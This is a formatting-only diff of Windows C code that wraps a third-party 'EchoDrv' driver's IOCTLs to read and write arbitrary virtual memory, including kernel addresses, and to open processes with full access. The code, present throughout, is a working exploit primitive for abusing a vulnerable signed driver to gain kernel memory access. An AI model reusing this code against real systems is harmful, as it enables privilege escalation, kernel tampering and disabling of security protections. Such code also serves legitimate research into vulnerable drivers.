@@ -10,21 +10,19 @@
 HANDLE gEchoDrvClientHandle = NULL;
 
 /*
-* EchoDrvReadWriteVirtualMemory
-*
-* Purpose:
-*
-* Read/Write virtual memory via EchoDrv.
-*
-*/
-BOOL WINAPI EchoDrvReadWriteVirtualMemory(
-    _In_ HANDLE DeviceHandle,
-    _In_ ULONG_PTR VirtualAddress,
-    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
-    _In_ ULONG NumberOfBytes,
-    _In_ BOOL DoWrite
-)
-{
+ * EchoDrvReadWriteVirtualMemory
+ *
+ * Purpose:
+ *
+ * Read/Write virtual memory via EchoDrv.
+ *
+ */
+BOOL WINAPI EchoDrvReadWriteVirtualMemory(_In_ HANDLE DeviceHandle,
+                                          _In_ ULONG_PTR VirtualAddress,
+                                          _In_reads_bytes_(NumberOfBytes)
+                                              PVOID Buffer,
+                                          _In_ ULONG NumberOfBytes,
+                                          _In_ BOOL DoWrite) {
     ECHODRV_COPYVM_REQUEST request;
 
     RtlSecureZeroMemory(&request, sizeof(request));
@@ -32,8 +30,7 @@ BOOL WINAPI EchoDrvReadWriteVirtualMemory(
     if (DoWrite) {
         request.FromAddress = Buffer;
         request.ToAddress = (PVOID)VirtualAddress;
-    }
-    else {
+    } else {
         request.FromAddress = (PVOID)VirtualAddress;
         request.ToAddress = Buffer;
     }
@@ -41,70 +38,54 @@ BOOL WINAPI EchoDrvReadWriteVirtualMemory(
     request.BufferSize = (SIZE_T)NumberOfBytes;
     request.ProcessHandle = gEchoDrvClientHandle;
 
-    return supCallDriver(DeviceHandle,
-        IOCTL_ECHODRV_COPYVM,
-        &request,
-        sizeof(request),
-        &request,
-        sizeof(request));
+    return supCallDriver(DeviceHandle, IOCTL_ECHODRV_COPYVM, &request,
+                         sizeof(request), &request, sizeof(request));
 }
 
 /*
-* EchoDrvWriteVirtualMemory
-*
-* Purpose:
-*
-* Write virtual memory via EchoDrv.
-*
-*/
-BOOL WINAPI EchoDrvWriteVirtualMemory(
-    _In_ HANDLE DeviceHandle,
-    _In_ ULONG_PTR VirtualAddress,
-    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
-    _In_ ULONG NumberOfBytes
-)
-{
-    return EchoDrvReadWriteVirtualMemory(DeviceHandle,
-        VirtualAddress,
-        Buffer,
-        NumberOfBytes,
-        TRUE);
+ * EchoDrvWriteVirtualMemory
+ *
+ * Purpose:
+ *
+ * Write virtual memory via EchoDrv.
+ *
+ */
+BOOL WINAPI EchoDrvWriteVirtualMemory(_In_ HANDLE DeviceHandle,
+                                      _In_ ULONG_PTR VirtualAddress,
+                                      _In_reads_bytes_(NumberOfBytes)
+                                          PVOID Buffer,
+                                      _In_ ULONG NumberOfBytes) {
+    return EchoDrvReadWriteVirtualMemory(DeviceHandle, VirtualAddress, Buffer,
+                                         NumberOfBytes, TRUE);
 }
 
 /*
-* EchoDrvReadVirtualMemory
-*
-* Purpose:
-*
-* Read virtual memory via EchoDrv.
-*
-*/
-BOOL WINAPI EchoDrvReadVirtualMemory(
-    _In_ HANDLE DeviceHandle,
-    _In_ ULONG_PTR VirtualAddress,
-    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
-    _In_ ULONG NumberOfBytes
-)
-{
-    return EchoDrvReadWriteVirtualMemory(DeviceHandle,
-        VirtualAddress,
-        Buffer,
-        NumberOfBytes,
-        FALSE);
+ * EchoDrvReadVirtualMemory
+ *
+ * Purpose:
+ *
+ * Read virtual memory via EchoDrv.
+ *
+ */
+BOOL WINAPI EchoDrvReadVirtualMemory(_In_ HANDLE DeviceHandle,
+                                     _In_ ULONG_PTR VirtualAddress,
+                                     _Out_writes_bytes_(NumberOfBytes)
+                                         PVOID Buffer,
+                                     _In_ ULONG NumberOfBytes) {
+    return EchoDrvReadWriteVirtualMemory(DeviceHandle, VirtualAddress, Buffer,
+                                         NumberOfBytes, FALSE);
 }
 
 /*
-* EchoDrvRegisterDriver
-*
-* Purpose:
-*
-* Echo client registration routine.
-*
-*/
-BOOL WINAPI EchoDrvRegisterDriver(
-    _In_ HANDLE DeviceHandle,
-    _In_opt_ PVOID Param)
-{
+ * EchoDrvRegisterDriver
+ *
+ * Purpose:
+ *
+ * Echo client registration routine.
+ *
+ */
+BOOL WINAPI EchoDrvRegisterDriver(_In_ HANDLE DeviceHandle,
+                                  _In_opt_ PVOID Param) {
     UNREFERENCED_PARAMETER(Param);
 
     BOOL bResult;
@@ -114,57 +95,49 @@ BOOL WINAPI EchoDrvRegisterDriver(
     RtlSecureZeroMemory(&regRequest, sizeof(regRequest));
 
     //
-    // Send empty buffer so this crapware driver will remember client pid to it global variable.
-    // Theorerically this BS driver should do some crypto next-gen calculations but life is
-    // not working as authors expected.
+    // Send empty buffer so this crapware driver will remember client pid to it
+    // global variable. Theorerically this BS driver should do some crypto
+    // next-gen calculations but life is not working as authors expected.
     //
 
-    bResult = supCallDriver(DeviceHandle,
-        IOCTL_ECHODRV_REGISTER,
-        &regRequest,
-        sizeof(regRequest),
-        &regRequest,
-        sizeof(regRequest));
+    bResult =
+        supCallDriver(DeviceHandle, IOCTL_ECHODRV_REGISTER, &regRequest,
+                      sizeof(regRequest), &regRequest, sizeof(regRequest));
 
     if (bResult) {
-
         //
-        // Only to make MmCopyVirtualMemory work as it expects process object as param. 
-        // 
-        // However we are working with kernel VA and KernelMode processor mode is set by AC.
+        // Only to make MmCopyVirtualMemory work as it expects process object as
+        // param.
+        //
+        // However we are working with kernel VA and KernelMode processor mode
+        // is set by AC.
         //
         RtlSecureZeroMemory(&procRequest, sizeof(procRequest));
 
         procRequest.ProcessId = GetCurrentProcessId();
         procRequest.DesiredAccess = GENERIC_ALL;
 
-        bResult = supCallDriver(DeviceHandle,
-            IOCTL_ECHODRV_OPEN_PROCESS,
-            &procRequest,
-            sizeof(procRequest),
-            &procRequest,
-            sizeof(procRequest));
+        bResult = supCallDriver(DeviceHandle, IOCTL_ECHODRV_OPEN_PROCESS,
+                                &procRequest, sizeof(procRequest), &procRequest,
+                                sizeof(procRequest));
 
         if (bResult)
             gEchoDrvClientHandle = procRequest.ProcessHandle;
-
     }
 
     return bResult;
 }
 
 /*
-* EchoDrvUnregisterDriver
-*
-* Purpose:
-*
-* Echo unregister routine.
-*
-*/
-BOOL WINAPI EchoDrvUnregisterDriver(
-    _In_ HANDLE DeviceHandle,
-    _In_opt_ PVOID Param)
-{
+ * EchoDrvUnregisterDriver
+ *
+ * Purpose:
+ *
+ * Echo unregister routine.
+ *
+ */
+BOOL WINAPI EchoDrvUnregisterDriver(_In_ HANDLE DeviceHandle,
+                                    _In_opt_ PVOID Param) {
     UNREFERENCED_PARAMETER(DeviceHandle);
     UNREFERENCED_PARAMETER(Param);
 
@@ -175,19 +148,17 @@ BOOL WINAPI EchoDrvUnregisterDriver(
 }
 
 /*
-* EchoDrvOpenProcess
-*
-* Purpose:
-*
-* Open process via Echo driver.
-*
-*/
-BOOL WINAPI EchoDrvOpenProcess(
-    _In_ HANDLE DeviceHandle,
-    _In_ HANDLE ProcessId,
-    _In_ ACCESS_MASK DesiredAccess,
-    _Out_ PHANDLE ProcessHandle)
-{
+ * EchoDrvOpenProcess
+ *
+ * Purpose:
+ *
+ * Open process via Echo driver.
+ *
+ */
+BOOL WINAPI EchoDrvOpenProcess(_In_ HANDLE DeviceHandle,
+                               _In_ HANDLE ProcessId,
+                               _In_ ACCESS_MASK DesiredAccess,
+                               _Out_ PHANDLE ProcessHandle) {
     BOOL bResult = FALSE;
     ECHODRV_OPENPROCESS_REQUEST procRequest;
 
@@ -196,12 +167,9 @@ BOOL WINAPI EchoDrvOpenProcess(
     procRequest.ProcessId = HandleToUlong(ProcessId);
     procRequest.DesiredAccess = DesiredAccess;
 
-    bResult = supCallDriver(DeviceHandle,
-        IOCTL_ECHODRV_OPEN_PROCESS,
-        &procRequest,
-        sizeof(procRequest),
-        &procRequest,
-        sizeof(procRequest));
+    bResult =
+        supCallDriver(DeviceHandle, IOCTL_ECHODRV_OPEN_PROCESS, &procRequest,
+                      sizeof(procRequest), &procRequest, sizeof(procRequest));
 
     *ProcessHandle = procRequest.ProcessHandle;
 
